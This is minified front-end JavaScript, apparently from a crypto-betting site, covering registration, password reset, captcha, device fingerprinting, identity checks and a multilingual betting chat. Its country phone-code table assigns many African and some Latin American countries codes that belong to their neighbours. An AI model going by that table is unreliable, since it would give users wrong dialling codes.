        errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&forgot-password", 1);
        let e = document.getElementById("mobile-block-forgot");
        if (window.innerWidth < 768 ? (e.style.height = "100vh", e.style.display = "block") : e.style.display = "flex", !document.getElementById("module-forg3")) {
            let t = await axios.get("/modals/forgot.php").catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }));
            e.innerHTML = t.data
        }
    };

function forgot() {
    let e = document.getElementById("bibhja34");
    e && (e.disabled = !0), widgetIDR = hcaptcha.render("hcaptcha4", {
        sitekey: "04e6d4b5-6775-4735-b3ef-4f5c15175701",
        size: "invisible"
    }), hcaptcha.execute(widgetIDR, {
        async: !0
    }).then((({
        response: e,
        key: t
    }) => {
        forgotl(e)
    }))
}

function forgotl(e) {
    let t = document.getElementById("bibhja34");
    t && (t.disabled = !0);
    let s = document.getElementById("header-forgot-wrapper"),
        a = s.querySelectorAll(".inputVal8")[0],
        n = a.value;
    if (n.length <= 0) return createNotifyL(1, "", lp.Error), void(t && (t.disabled = !1));
    s.classList.remove("_1rJPL");
    let r = new FormData;
    r.set("action", "forgot"), r.set("email", n), r.set("h-recaptcha-response", e), axios.post("/user/func.php", r).then((e => {
        t && (t.disabled = !1), 0 == e.data.id[0] ? (createNotifyL(2, lp["We recieve code on your email"], lp.Success), a.value = "", closeForgot()) : createNotifyL(1, e.data.m, lp.Error)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}

function finishSign() {
    let e = document.getElementById("brji879");
    e && (e.disabled = !0), widgetIDS = hcaptcha.render("hcaptcha", {
        sitekey: "04e6d4b5-6775-4735-b3ef-4f5c15175701",
        size: "invisible"
    }), hcaptcha.execute(widgetIDS, {
        async: !0
    }).then((({
        response: e,
        key: t
    }) => {
        finishSignl(e)
    }))
}
async function finishSignl(e) {
    let t, s = 0,
        a = document.getElementById("registr-pass"),
        n = document.getElementById("brji879");
    n && (n.disabled = !0);
    let r, o = a.querySelectorAll(".inputVal2")[0].value;
    t = document.getElementById("registr-email"), r = t.querySelectorAll(".inputVal2")[0].value;
    !/[\;\#\n\r\*\'\"<>&\%\!\(\)\{\}\[\]\?\\/\s]/.test(r) && /^.+\@(\[?)[a-zA-Z0-9\-\.]+\.([a-zA-Z]{2,4}|[0-9]{1,4})(\]?)$/.test(r) || (t.classList.add("_1rJPL"), s = 1, n && (n.disabled = !1)), o.length < 6 && (a.classList.add("_1rJPL"), s = 1, n && (n.disabled = !1));
    new Promise(((e, t) => {
        const s = document.createElement("script");
        s.onload = e, s.onerror = t, s.async = !0, s.src = "https://fpjscdn.net/v3/NBNrszAxudg6Ogv361Sc/iife.min.js", document.head.appendChild(s)
    })).then((() => FingerprintJS.load().then((e => e.get())).then((async i => {
        if (0 == s) {
            let s = new FormData;
            s.set("action", "registration"), s.set("email", r), s.set("passw", o), s.set("bonuse", 0), 1 == promoExist && s.set("promocode", document.getElementById("reg_promo_tex").value), s.set("emailrecieve", 1), s.set("action", "registration"), s.set("regtype", 1), s.set("agree", agree), s.set("userid", i.visitorId), s.set("i18", 1), s.set("h-recaptcha-response", e);
            let l = gD("coins_preloadOpen");
            l && (l.style.display = "flex"), await axios({
                method: "post",
                url: "/user/func.php",
                data: s,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((async function(e) {
                l && (l.style.display = ""), n && (n.disabled = !1), parseInt(e.data.id[0], 10) ? (a.classList.add("_1rJPL"), t.classList.add("_1rJPL"), createNotifyL(1, e.data.m, lp.Error)) : (a.classList.remove("_1rJPL"), t.classList.remove("_1rJPL"), document.cookie = "entry99=1; max-age=31536000; path=/", gdataLayer3("Registration"), location.reload())
            })).catch((function(e) {
                a && a.classList.add("_1rJPL"), t && t.classList.add("_1rJPL"), l && (l.style.display = ""), n && (n.disabled = !1), createNotifyL(1, e.message, lp.Error)
            }))
        }
    }))))
}
document.addEventListener("visibilitychange", (function() {
    document.hidden && (reloadCoin = !0, timeRCoin = new Date)
})), window.addEventListener("focus", (() => {
    if (1 == reloadCoin) {
        reloadCoin = !1;
        let e = new Date;
        if (0 != timeRCoin && null != timeRCoin) {
            let t = 60 * e.getHours() * 60 + 60 * e.getMinutes() + e.getSeconds() - 60 * timeRCoin.getHours() * 60 - 60 * timeRCoin.getMinutes() - timeRCoin.getSeconds();
            if (timeRCoin = "", t > 30 && "Box" == pageNameM && (boxTimeIn && clearInterval(boxTimeIn), window.openBox(!0)), window.socketChatJG && (null == window.socketChatJG.disconnected || window.socketChatJG.disconnected)) return void setTimeout((() => {
                createScriptChat()
            }), 100);
            if (t > 240 && !isMobile()) return void setTimeout((() => {
                createScriptChat()
            }), 100);
            t > 30 && isMobile() && setTimeout((() => {
                createChatWeb(chatRoomN, !1, !0)
            }), 100)
        }
    }
}));
let timeRCoin, reloadCoin = !0;

function launchWebSdk(e, t) {
    snsWebSdk.init(e, (() => this.getNewAccessToken())).withConf({
        lang: "en",
        email: t,
        i18n: {
            document: {
                subTitles: {
                    IDENTITY: "Upload a document that proves your identity"
                }
            }
        },
        onMessage: (e, t) => {
            console.log("WebSDK onMessage", e, t)
        },
        onError: e => {
            console.error("WebSDK onError", e)
        }
    }).withOptions({
        addViewportTag: !1,
        adaptIframeHeight: !0
    }).on("stepCompleted", (e => {
        console.log("stepCompleted", e)
    })).on("onError", (e => {
        console.log("onError", payload)
    })).onMessage(((e, t) => {
        console.log("onMessage", e, t)
    })).build().launch("#sumsub-websdk-container")
}
async function getNewAccessToken() {
    let e = await getVerif();
    return Promise.resolve(e)
}
const countryPhoneCodes = {
    US: "+1",
    CA: "+1",
    RU: "+7",
    KZ: "+7",
    EG: "+20",
    ZA: "+27",
    GR: "+30",
    NL: "+31",
    BE: "+32",
    FR: "+33",
    ES: "+34",
    HU: "+36",
    IT: "+39",
    RO: "+40",
    AT: "+43",
    GB: "+44",
    DK: "+45",
    SE: "+46",
    NO: "+47",
    PL: "+48",
    DE: "+49",
    PE: "+51",
    MX: "+52",
    AR: "+54",
    BR: "+55",
    CL: "+56",
    CO: "+57",
    VE: "+58",
    MY: "+60",
    ID: "+62",
    PH: "+63",
    NZ: "+64",
    SG: "+65",
    TH: "+66",
    JP: "+81",
    KR: "+82",
    VN: "+84",
    CN: "+86",
    TR: "+90",
    IN: "+91",
    PK: "+92",
    LK: "+94",
    MM: "+95",
    IR: "+98",
    MA: "+212",
    DZ: "+213",
    TN: "+216",
    LY: "+218",
    GM: "+220",
    SN: "+221",
    MR: "+222",
    ML: "+223",
    GN: "+224",
    CI: "+225",
    BF: "+226",
    NE: "+227",
    TG: "+228",
    BJ: "+229",
    MU: "+230",
    SL: "+232",
    LR: "+233",
    GH: "+234",
    NG: "+235",
    TD: "+236",
    CF: "+237",
    CM: "+238",
    CV: "+239",
    ST: "+240",
    GQ: "+241",
    GA: "+242",
    CD: "+243",
    AO: "+244",
    GW: "+245",
    IO: "+246",
    SC: "+248",
    RW: "+250",
    ET: "+251",
    SO: "+253",
    DJ: "+254",
    KE: "+255",
    TZ: "+256",
    UG: "+257",
    BI: "+258",
    ZM: "+260",
    MG: "+261",
    RE: "+262",
    ZW: "+263",
    NA: "+264",
    MW: "+265",
    LS: "+266",
    BW: "+267",
    SZ: "+268",
    KM: "+269",
    SH: "+290",
    ER: "+291",
    AW: "+297",
    FO: "+298",
    GL: "+299",
    GI: "+350",
    PT: "+351",
    LU: "+352",
    IE: "+353",
    IS: "+354",
    AL: "+355",
    MT: "+356",
    CY: "+357",
    FI: "+358",
    BG: "+359",
    LT: "+370",
    LV: "+371",
    EE: "+372",
    MD: "+373",
    AM: "+374",
    AD: "+376",
    MC: "+377",
    SM: "+378",
    VA: "+379",
    UA: "+380",
    RS: "+381",
    ME: "+382",
    HR: "+385",
    SI: "+386",
    BA: "+387",
    MK: "+389",
    CZ: "+420",
    SK: "+421",
    LI: "+423",
    FK: "+500",
    BZ: "+501",
    GT: "+502",
    SV: "+503",
    HN: "+504",
    NI: "+505",
    CR: "+506",
    PA: "+507",
    PM: "+508",
    HT: "+509",
    MF: "+590",
    BO: "+591",
    GY: "+592",
    EC: "+593",
    GF: "+594",
    PY: "+595",
    MQ: "+596",
    SR: "+597",
    UY: "+598",
    TL: "+670",
    NF: "+672",
    BN: "+673",
    NR: "+674",
    PG: "+675",
    TO: "+676",
    SB: "+677",
    VU: "+678",
    FJ: "+679",
    PW: "+680",
    WF: "+681",
    CK: "+682",
    NU: "+683",
    WS: "+685",
    KI: "+686",
    NC: "+687",
    TV: "+688",
    PF: "+689",
    TK: "+690",
    FM: "+691",
    MH: "+692",
    HK: "+852",
    MO: "+853",
    KH: "+855",
    LA: "+856",
    BD: "+880",
    TW: "+886",
    MV: "+960",
    LB: "+961",
    JO: "+962",
    KW: "+965",
    SA: "+966",
    YE: "+967",
    OM: "+968",
    PS: "+970",
    AE: "+971",
    IL: "+972",
    BH: "+973",
    QA: "+974",
    BT: "+975",
    MN: "+976",
    NP: "+977",
    TJ: "+992",
    TM: "+993",
    AZ: "+994",
    GE: "+995",
    KG: "+996",
    UZ: "+998",
    BS: "+1242",
    BB: "+1246",
    AI: "+1264",
    AG: "+1268",
    VG: "+1284",
    KY: "+1345",
    BM: "+1441",
    GD: "+1473",
    MS: "+1649",
    SKN: "+1664",
    MP: "+1670",
    GU: "+1671",
    SXM: "+1721",
    LC: "+1758",
    DM: "+1767",
    VC: "+1784",
    CUW: "+1787",
    DO: "+1809",
    TT: "+1868",
    KN: "+1869",
    JM: "+1876",
    AX: "+4779",
    BQ: "+5997"
};
var pathSocketChatG = "/coins_notify_ws/",
    chatLanguage = {
        ru: {
            Time: "Время",
            "Bet details": "Детали ставки",
            bet: "ставки",
            Multiplier: "Множитель",
            Profit: "Прибыль",
            "Send in Chat": "Отправить в чат",
            "Brilliant win!": "Победа прекрасна!",
            "Lose is nothing!": "Поражение это ничто!",
            "I'm in luck Today!": "Сегодня мне повезло!"
        },
        en: {
            Time: "Time",
            "Bet details": "Bet details",
            bet: "bet",
            Multiplier: "Multiplier",
            Profit: "Profit",
            "Send in Chat": "Send in Chat",
            "Brilliant win!": "Brilliant win!",
            "Lose is nothing!": "Lose is nothing!",
            "I'm in luck Today!": "I'm in luck Today!"
        },
        hi: {
            Time: "समय",
            "Bet details": "दाँव का विवरण",
            bet: "दाँव",
            Multiplier: "गुणक",
            Profit: "फायदा",
            "Send in Chat": "चैट पर भेजें",
            "Brilliant win!": "अच्छी जीत है!",
            "Lose is nothing!": "हार कुछ भी नहीं है!",
            "I'm in luck Today!": "आज मेरी किस्मत अच्छी है!"
        },
        fr: {
            Time: "Temps",
            "Bet details": "Détails de la mise",
            bet: "de mise",
            Multiplier: "Multiplicateur",
            Profit: "Revenu",
            "Send in Chat": "Envoyer pour discuter",
            "Brilliant win!": "La victoire est excellente!",
            "Lose is nothing!": "La défaite c’est rien!",
            "I'm in luck Today!": "Aujourd’hui j’ai eu de la chance!"
        },
        es: {
            Time: "Tiempo",
            "Bet details": "Detalles de la apuesta",
            bet: "de la apuesta",
            Multiplier: "Multiplicador",
            Profit: "Ganancia",
            "Send in Chat": "Enviar al chat",
            "Brilliant win!": "¡La victoria es genial!",
            "Lose is nothing!": "¡La derrota no es nada!",
            "I'm in luck Today!": "¡Hoy tuve suerte!"
        },
        de: {
            Time: "Zeit",
            "Bet details": "Wettendetails",
            bet: "Wetten",
            Multiplier: "Multiplikator",
            Profit: "Gewinn",
            "Send in Chat": "An Chat senden",
            "Brilliant win!": "Der Sieg ist schön!",
            "Lose is nothing!": "Niederlage bedeutet nichts!",
            "I'm in luck Today!": "Heute habe ich Glück!"
        },
        tr: {
            Time: "Zaman",
            "Bet details": "Bahis detayları",
            bet: "bahis numarası",
            Multiplier: "Çarpan",
            Profit: "Kâr",
            "Send in Chat": "Sohbete Gönder",
            "Brilliant win!": "Mükemmel zafer!",
            "Lose is nothing!": "Yenilgi hiçbir şeydir!",
            "I'm in luck Today!": "Bugün şanslıyım!"
        },
        fl: {
            Time: "Oras",
            "Bet details": "Mga detalye ng taya",
            bet: "taya",
            Multiplier: "Multiplier",
            Profit: "Kita",
            "Send in Chat": "Ipadala sa Chat",
            "Brilliant win!": "Napakahusay na panalo!",
            "Lose is nothing!": "Walang talo!",
            "I'm in luck Today!": "Ang swerte ko Ngayon!"
        },
        pt: {
            Time: "Hora",
            "Bet details": "Detalhes de aposta",
            bet: "de aposta",
            Multiplier: "Multiplicador",
            Profit: "Benefício",
            "Send in Chat": "Enviar para o chat",
            "Brilliant win!": "A vitória é bela!",
            "Lose is nothing!": "A derrota é nada!",
            "I'm in luck Today!": "Hoje tive a sorte!"
        },
        pl: {
            Time: "Czas",
            "Bet details": "Szczegóły zakładu",
            bet: "zakład",
            Multiplier: "Mnożnik",
            Profit: "Dochód",
            "Send in Chat": "Wysłać na czat",
            "Brilliant win!": "Błyskotliwe zwycięstwo!",
            "Lose is nothing!": "Porażka to nic!",
            "I'm in luck Today!": "Mam dziś szczęście!"
        },
        fa: {
            Time: "ساعت",
            "Bet details": "جزئیات شرط بندی",
            bet: "شرط بندی",
            Multiplier: "ضرب کننده",
            Profit: "سود",
            "Send in Chat": "ارسال به چت",
            "Brilliant win!": "برد عالی!",
            "Lose is nothing!": "باختن چیزی نیست!",
            "I'm in luck Today!": "من امروز خوش شانس هستم!"
        },
        ua: {
            Time: "Час",
            "Bet details": "Деталі ставки",
            bet: "ставки",
            Multiplier: "Множник",
            Profit: "Прибуток",
            "Send in Chat": "Надіслати в чат",
            "Brilliant win!": "Перемога прекрасна!",
            "Lose is nothing!": "Поразка - це ніщо!",
            "I'm in luck Today!": "Сьогодні мені пощастило!"
        },
        az: {
            Time: "Vaxt",
            "Bet details": "Mərc təfərrüatları",
            bet: "Mərc",
            Multiplier: "Vuran",
            Profit: "Qazanç",
            "Send in Chat": "Söhbətə göndərin",
            "Brilliant win!": "Qələbə gözəldir!",
            "Lose is nothing!": "Məğlubiyyət heç nədir!",
            "I'm in luck Today!": "Bu gün bəxtim gətirdi!"
        }
    };
let lngG1 = lngGame,
    setTransChat = () => {
        lngG1 = chatLanguage[lngGame] ? lngGame : "en";
        let e = document;
        e.getElementById("c_d_textBetTwo11").innerHTML = chatLanguage[lngG1]["Bet details"] + " | " + gameName, e.getElementById("c_d_bet22").innerHTML = chatLanguage[lngG1].bet, e.getElementById("time78999").innerHTML = chatLanguage[lngG1].Time, e.getElementById("c_d_pay22").innerHTML = chatLanguage[lngG1].Multiplier, e.getElementById("c_d_profit22").innerHTML = chatLanguage[lngG1].Profit, e.getElementById("send_in_chat11").innerHTML = chatLanguage[lngG1]["Send in Chat"], e.getElementById("c_d_inp11").placeholder = chatLanguage[lngG1]["I'm in luck Today!"]
    },
    currentWeek = 1;

function changeParameter12() {
    let e = new Date;
    currentWeek = function(e) {
        let t = new Date(e.getFullYear(), 0, 1);
        return Math.ceil(((e - t) / 864e5 + t.getDay() + 1) / 7)
    }(e), currentWeek = currentWeek % 4 + 1, currentWeek || (currentWeek = 1)
}
changeParameter12();
let rootChat = document.documentElement;
window.innerWidth > 1024 ? rootChat.style.setProperty("--marginTopChat", topForChatGame + "px") : rootChat.style.setProperty("--marginTopChat", topForChatGameMob + "px");
let fixCorBet = 0,
    errFixBet = () => {
        fixCorBet = window.pageYOffset;
        let e = document.getElementsByTagName("body")[0];
        e && e.classList.add("importantF"), e = document.getElementsByTagName("html")[0], e && (e.style.overflow = "hidden"), e = document.getElementById("home"), e && (e.style.top = "-" + fixCorBet + "px"), e && (e.style.marginBottom = "-" + fixCorBet + "px")
    },
    errUnFixBet = () => {
        if (window.innerWidth < 451 && 2 == statusChatGame) return;
        let e = document.getElementsByTagName("body")[0];
        e && e.classList.remove("importantF"), e = document.getElementsByTagName("html")[0], e && (e.style.overflow = ""), e = document.getElementById("home"), e && (e.style.top = ""), e && (e.style.marginBottom = ""), window.scrollTo(0, fixCorBet)
    };
window.closeChatGame = () => {
    document.getElementsByClassName("chatGameWr769")[0].style.display = "none", skip5show || createLineMSG(2), document.getElementById("chat_control11").classList.remove("active"), statusChatGame = 1, controlCont(2), window.innerWidth < 451 && errUnFixBet(), underActiveSet(5);
    let e = document.getElementById("change_drop11");
    if (e = e.parentNode, e.classList.contains("is_open") && chooseDropsChat({
            currentTarget: document.getElementById("change_drop11")
        }), 1 == sportNewST && ("sport" == pageNameM || "liveSp" == pageNameM)) {
        let e, t;
        isMobile() ? (e = 50, t = 0) : (e = 0, t = 85), btNewSport && btNewSport.updateOptions({
            betSlipOffsetRight: t,
            betSlipOffsetBottom: e
        })
    }
};
let statusChatGame = 1;
window.openChat = e => {
    let t = document.getElementsByClassName("chatGameWr769")[0];
    if ("1" == t.dataset.status ? (t.dataset.status = "2", openRoomChat(document.getElementsByClassName("olcq_" + chatRoomN)[0], chatRoomN, e, !0)) : countMesChat > 50 ? createChatWeb(chatRoomN, e) : e && e(), "block" == t.style.display) closeChatGame();
    else if (statusChatGame = 2, skip5show || (countMesChat = 0), changeCountNot(1), t.style.display = "block", document.getElementById("chat_control11").classList.add("active"), 2 == statusNotif && closeNotif(), controlCont(1), window.innerWidth < 451 && errFixBet(), 1 == sportNewST && ("sport" == pageNameM || "liveSp" == pageNameM)) {
        let e, t;
        isMobile() ? (e = 50, t = 400) : (e = 0, t = 400), btNewSport && btNewSport.updateOptions({
            betSlipOffsetRight: t,
            betSlipOffsetBottom: e
        })
    }
}, window.f8983 = () => {
    chooseDropsChat({
        currentTarget: document.getElementById("change_drop11")
    })
}, window.chooseDropsChat = e => {
    e.stopPropagation && e.stopPropagation(), e.preventDefault && e.preventDefault(), e = e.currentTarget.parentNode;
    let t = document.getElementsByClassName("select11-options")[0];
    e.classList.contains("is_open") ? (e.classList.remove("is_open"), t.style.display = "none", window.removeEventListener("click", f8983)) : (e.classList.add("is_open"), t.style.display = "block", setTimeout((() => {
        window.addEventListener("click", f8983)
    }), 0))
}, window.openRoomChat = (e, t, s = !1, a = !1) => {
    if (!e.classList.contains("active")) {
        Array.from(document.getElementsByClassName("optionLngChatGame")).forEach((e => {
            e.classList.remove("active")
        })), e.classList.add("active"), document.getElementById("labelLngChatGame").innerHTML = e.innerHTML, socketChatJG.emit("closeChat"), chatRoomN = t, localStorage.setItem("chatRoomN", chatRoomN), createChatWeb(t, s), timeAvatars = Date.now(), timeAvatarsC = Date.now();
        let n = document.getElementById("change_drop11");
        n = {
            currentTarget: n
        }, a || chooseDropsChat(n)
    }
}, window.checkSendInChat = e => {
    "Enter" === e.key && sendChatMsg()
}, window.countSendInChat = e => {
    let t = document.getElementById("chat_ct12");
    t.innerHTML = e.length, t = document.getElementsByClassName("img_count_sm")[0], Number(e.length) > 500 ? t.classList.contains("active") || t.classList.add("active") : t.classList.contains("active") && t.classList.remove("active")
}, window.chooseCatChatE = e => {
    let t = document.getElementsByClassName("emoji-box-wrap")[0],
        s = t.getElementsByClassName("emoji-box");
    if (Array.from(s).forEach((e => {
            e.classList.remove("active")
        })), s[e].classList.add("active"), s = t.getElementsByClassName("emoji-icon"), Array.from(s).forEach((e => {
            e.classList.remove("active")
        })), s[e].classList.add("active"), 6 == e && (s = document.getElementsByClassName("emoji-gifts")[0], "" == s.innerHTML)) {
        let e = "";
        for (let t = 1; t < 16; t++) e += `<img onclick="sendChatMsg(1,'${t}');openChatEmo(1);"  src="/assets/chat/img/gifs/week${currentWeek}/${t}.gif" alt="Gif">`;
        s.innerHTML = e
    }
};
let chTMes78 = e => {
    let t = e.replaceAll(" ", "").toLowerCase();
    return -1 != t.indexOf("www.") || -1 != t.indexOf("http://") || -1 != t.indexOf("https://") ? "" : e = e.replace(/[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g, "").replaceAll(/( |<([^>]+)>)/gi, " ").replace(/\s+/g, " ").replaceAll("http://", "").replaceAll("https://", "").trim()
};
window.sendChatMsg = (e, t) => {
    if ("0" == user_in) createNotifyL(1, "Not user", lp.Error);
    else {
        if (1 != activateEmail) return void createNotifyL(1, "Verify Email", lp.Error);
        let s = document.getElementById("text_u_chatG");
        s.blur();
        let a = {};
        1 != e && 1 != statusQuote && (a = {
            text: chTMes78(s.value),
            type: "text"
        }, s.value = "", countSendInChat("")), 1 == e && (a = {
            gif: t,
            type: "gif"
        }), 1 == statusQuote && (a = {
            text: chTMes78(s.value),
            type: "quote",
            quote: {
                text: document.getElementById("quote_text0").innerHTML,
                name: document.getElementById("quote_name0").innerHTML
            }
        }, s.value = "", countSendInChat(""), chatCloseQuote()), socketChatJG.emit("message", a, (() => {}))
    }
}, window.sendDropCoins = e => {
    let t = -1,
        s = document.getElementById("drop_amount_co1").value;
    Number(s) <= 0 && (createNotifyL(1, "Wrong amount", lp.Error), t = 2);
    let a = document.getElementById("drop_count_co1").value;
    if ((Number(a) < 5 || Number(a) > 100) && (createNotifyL(1, "Wrong count users", lp.Error), t = 2), 1 == Number(userLevel) && (t = 2, createNotifyL(1, "Min level 2", lp.Error)), checkBtnDrop() || (createNotifyL(1, "Wrong amount", lp.Error), t = 2), -1 == t) {
        e && (e.disabled = !0);
        let t = {
            type: "rain" == statusChatDrop ? "randomRain" : "clickRain",
            text: chTMes78(document.getElementById("drop_text_co1").value),
            rainUsersCount: a,
            rainAmount: s,
            rainCurrency: document.getElementById("with_imageCur6").getAttribute("alt")
        };
        "rain" != statusChatDrop && (t.action = "new"), socketChatJG.emit("message", t, (() => {
            scrollChatBottom(1), e && (e.disabled = !1);
            let t = document.getElementById("chat_game11");
            if (t = t.getElementsByClassName("avatar"), t = t[t.length - 1], t && (t.classList.add("my_avatar"), "rain" != statusChatDrop)) {
                let e = t.parentNode.parentNode.getElementsByClassName("btn_medium")[0];
                e && e.setAttribute("disabled", !0)
            }
        })), closeSendDropChat()
    }
};
let raiDrId = 0;

function rainSubmit(e) {
    e.set("rainId", raiDrId), axios({
        method: "post",
        url: "/site/chat_rain_click2.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((e => {
        document.getElementById("btnCoinRain" + raiDrId).setAttribute("disabled", !0), document.cookie = `r_${raiDrId}=1; expires=Tue, 19 Jan 2041 03:14:07 GMT`;
        let t = new Date,
            s = t.getTime();
        s += 36e5, t.setTime(s), document.cookie = `r_${raiDrId}=1; expires=` + t.toUTCString() + "; path=/", raiDrId = 0
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}
window.clickRainDrop = e => {
    raiDrId = e, sendcaptch11(2)
}, window.openSendChat = (e, t) => {
    2 != t && (e.preventDefault(), e.stopPropagation()), e = (e = e.currentTarget).parentNode.parentNode;
    let s = () => {
        openSendChat({
            currentTarget: {
                parentNode: {
                    parentNode: document.getElementById("chat_wr_inp11")
                }
            }
        }, 2)
    };
    1 == t && (window.addEventListener("click", s), e.classList.add("send")), 2 == t && (window.removeEventListener("click", s), e.classList.remove("send"))
}, window.chatTagName = e => {
    let t = document.getElementById("text_u_chatG");
    t && (t.value = "@" + chFDV7(e.innerHTML, 1) + " " + t.value)
};
let statusQuote = 2;
window.chatSendQuote = e => {
    let t = document.getElementById("quote_wr0");
    t.style.display = "flex", statusQuote = 1, t = document.getElementById("quote_name0"), t.innerHTML = document.getElementById("cnChNa" + e).innerHTML, t = document.getElementById("quote_text0"), t.innerHTML = document.getElementById("cnChTe" + e).innerHTML, t = document.getElementById("text_u_chatG"), t && t.click()
}, window.chatCloseQuote = () => {
    statusQuote = 2, document.getElementById("quote_wr0").style.display = "none"
};
let createTextType = (e, t) => {
        if (1 == t) return `<div class="quote_wr3" style="display: flex;">\n      <div class="quote_content">\n        <div class="quote_name1">${e.quote.name}</div>\n        <div class="quote_text1">${e.quote.text}</div>\n      </div>\n    </div>`;
        if (2 == t) return `<img onclick="chatSendQuote('${e.id}')" class="chat_share2" src="/assets/chat/img/share.svg?x=75" alt="Share">`;
        if (3 == t) {
            let t = Number(e.gif) > 15 ? 15 : e.gif;
            return `<img loading="lazy" class="chCGGIF" src="/assets/chat/img/gifs/week${currentWeek}/${t}.gif" alt="Gif">`
        }
        if (4 == t) {
            let t = "";
            e.rainUsers.forEach((s => {
                s.name || (s.name = s.userID), t += `<div class="item"><span class="cl-primary winner-name ellipsis">@${s.name}</span>\n        <div class="c1lwazez coin notranslate"><img  class="coin-icon" src="/assets/coins/${e.rainCurrency}.svg">\n        <div class="amount"><span class="amount-str">${window.truncatorCoins(Number(s.amount),8)}</span></div></div>\n        </div>`
            }));
            let s = "";
            e.rainUsers.length > 10 && (s = '<button onclick="rainUM(this)">More<button>');
            let a = "";
            return "" != e.text && (a = `<div class="text_c56">\n      ${e.text}</div>`), `\n      ${a}\n      <div class="m1grwu43 full-message"><div class="w1ha3sux chatmsg-user-list">\n      ${t}\n      </div>\n      ${s}\n      <div class="congratulations">${chatLanguage[lngG1]["Brilliant win!"]}</div></div>`
        }
        if (5 == t) {
            let t = "";
            (1 == Number(userLevel) || e.userChatId == userChatUID || -1 != document.cookie.indexOf(`r_${e.rainId}=1`) || e.isDone || e.isMy) && (t = "disabled");
            let s = "";
            return "" != e.text && (s = `<div class="text_c56">\n      ${e.text}</div>`), `\n      ${s}\n      <img  class="chat_img chat_rcrain" src="/assets/image/rain/coinsdroprain.jpg?x=sdf">\n      <button ${t} id="btnCoinRain${e.rainId}" onclick="clickRainDrop(${e.rainId})" class="btn btn_red btn_medium">${lp["Get it now"]}</button>\n      `
        }
    },
    rainUM = e => {
        let t = e.parentNode.getElementsByClassName("chatmsg-user-list")[0];
        t.classList.contains("more") ? (e.innerHTML = "More", t.classList.remove("more")) : (e.innerHTML = "Less", t.classList.add("more"))
    },
    createMsgChat = e => {
        let t = createTimeChatMsg(e.time),
            s = "";
        (e.userChatId == userChatUID || e.isMy) && (s = "my_avatar"), null == e.avatar && (e.avatar = 2), e.userLvl || (e.userLvl = 100), e.userLvlProgress || 0 == Number(e.userLvlProgress) || (e.userLvlProgress = 100), "gif" == e.type && (e.text = createTextType(e, 3)), "randomRain" != e.type && "finishRain" != e.type || (e.text = createTextType(e, 4)), "clickRain" == e.type && (e.text = createTextType(e, 5));
        let a = "";
        "text" != e.type && "quote" != e.type || (a = createTextType(e, 2)), isAdmin && (a += `<button data-n="${e.userName}" class="admin_close117" onclick="disBlockEv(event);openbanUserChat(this,'${e.userChatId}','${e.id}')">\n    <i class="error_icon1091" style="zoom:0.6;"></i></button>`);
        let n = "";
        "quote" == e.type && (n = createTextType(e, 1));
        let r = "";
        1 == e.extraSet && (r = '<span class="mdClassCh">Mod</span>');
        let o = "lvlC1";
        Number(e.userLvl) > 5 && (o = "lvlC2"), Number(e.userLvl) > 10 && (o = "lvlC3"), Number(e.userLvl) > 15 && (o = "lvlC4");
        let i = `\n    <img  class="avatar ${s}" width="40" style="border-radius: 50%;"\n        ${window.avSrcT(e.avatarId,e.avatarUrl,2)}>`;
        "Coins Game" == e.userName && (i = '<img loading="lazy" class="avatar" width="40"\n          src="/assets/coins_game_mob6.svg?x=2">');
        let l = Number(e.userLvlProgress) > 100 ? 100 : Number(e.userLvlProgress),
            c = "" != e.isVip ? '<img src="/assets/image/vipclub/vip2.svg" class="vip_cls" width="17px" height="17px" alt="VIP">' : "",
            d = document.getElementById("chat_game11"),
            u = document.createElement("div"),
            p = `\n    <div class="head">\n      ${i}\n      <div class="progress_lvl_user ${o}">${e.userLvl}</div>\n      <div class="pr_proc1">\n      <div style="width:${l}%" class="pr_lproc1 ${o}"></div>\n      </div>\n      </div>\n    <div class="content c23${e.type}">\n      <div class="title">\n        <div class="name">\n        ${c}\n        <span onclick="chatTagName(this)" id="cnChNa${e.id}">${e.userName}</span>\n          ${r}\n          <div class="time">${t}</div>\n          ${a}\n        </div>\n      </div>\n      ${n}\n      <div class="msg-wrap">\n        <div id="cnChTe${e.id}" class=" cGmsgT">\n        ${e.text}</div>\n      </div>\n    </div>`;
        u.setAttribute("id", `cGmMD${e.id}`), u.classList.add(`cGmId${e.userChatId}`), u.classList.add("cGmsg11"), u.innerHTML = p, d.appendChild(u)
    },
    createTimeChatMsg = e => {
        let t = new Date(e);
        return `${t.getHours()<10?"0"+t.getHours():t.getHours()}:${t.getMinutes()<10?"0"+t.getMinutes():t.getMinutes()}`
    },
    createBetChat = e => {
        let t = createTimeChatMsg(e.time);
        null != e.betInfo.currency && (e.betInfo.currency = e.betInfo.currency.toUpperCase());
        let s = e.betInfo.currency,
            a = "win",
            n = e.betInfo.amount_win,
            r = chatLanguage[lngG1]["Brilliant win!"],
            o = e.betInfo.coef + "x",
            i = 2;
        if (null != e.betInfo.currency && (i = betListCur[e.betInfo.currency].precision), 0 == e.betInfo.amount_win ? (a = "lose", o = "0.00x", r = chatLanguage[lngG1]["Lose is nothing!"], n = window.truncatorJet(Number(e.betInfo.amount_bet), i)) : (n = window.truncatorJet(Number(n), i), "dice" != e.game && "race_wheel" != e.game && "limbo" != e.game && "plinko" != e.game || (o = (e.betInfo.amount_win / e.betInfo.amount_bet).toFixed(2) + "x")), "double" == e.game) {
            let t = 1;
            "red" == e.betInfo.color && (t = 5), "black" == e.betInfo.color && (t = 2), "yellow" == e.betInfo.color && (t = 3), "green" == e.betInfo.color && (t = 50), o = t + "x"
        }
        "wheel" == e.game && (o = e.betInfo.amount_bet, String(o).length < 8 && (o = o + " " + e.betInfo.currency)), String(n).length > 7 && (s = "");
        let l = "";
        (e.userChatId == userChatUID || e.isMy) && (l = "my_avatar"), null == e.avatarId && (e.avatarId = 2);
        let c = "";
        "" != e.text && (c = `<div class="text_c56">\n    ${e.text}</div>`);
        let d = "";
        1 == e.extraSet && (d = '<span class="mdClassCh">Mod</span>');
        let u = "lvlC1";
